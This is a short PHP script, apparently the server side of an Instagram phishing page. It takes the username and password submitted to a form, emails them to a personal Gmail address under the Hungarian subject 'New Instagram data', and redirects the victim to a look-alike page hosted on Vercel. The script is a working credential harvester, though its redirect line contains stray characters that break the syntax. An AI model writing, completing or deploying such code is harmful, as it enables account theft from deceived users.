<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $to = "koni.batori@gmail.com";
    $subject = "Új Instagram adat";
    $message = "Felhasználónév: $username\nJelszó: $password";
    $headers = "From: noreply@teszt.com";

    mail($to, $subject, $message, $headers);
    header("Location:https://instagram-nine-alpha.vercel.app/ "/);
    exit();
} else {
    echo "Hiba történt!";
}
?>
